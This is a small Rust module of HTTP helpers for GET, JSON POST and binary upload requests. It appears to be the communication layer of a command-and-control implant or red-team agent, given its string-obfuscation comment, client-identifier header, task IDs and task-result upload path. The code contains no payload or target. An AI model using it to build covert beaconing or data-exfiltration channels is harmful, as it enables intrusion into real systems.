use fmtools::format; // using obfstr to obfuscate

pub(crate) fn get_request(
    url: &str,
    identifier: Option<&str>,
    user_agent: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut request = ureq::get(url).set("User-Agent", user_agent);

    if let Some(id) = identifier {
        request = request.set("X-Identifier", id);
    }

    let body = request.call()?.into_string()?;

    Ok(body)
}

pub(crate) fn post_request(
    url: &str,
    key: &str,
    data: &str,
    identifier: &str,
    user_agent: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let body: String = ureq::post(url)
        .set("User-Agent", user_agent)
        .set("Content-Type", "application/json")
        .set("X-Identifier", identifier)
        .send_string(&format!("{\""{key}"\": \""{data}"\"}"))?
        .into_string()?;

    Ok(body)
}

pub(crate) fn post_upload_request(
    url: &str, // Usually task_path + "/u"
    data: &str,
    identifier: &str,
    task_id: &str,
    user_agent: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let body: String = ureq::post(url)
        .set("User-Agent", user_agent)
        .set("Content-Type", "application/octet-stream")
        .set("X-Identifier", identifier)
        .set("X-Unique-ID", task_id)
        .send_string(data)?
        .into_string()?;

    Ok(body)
}
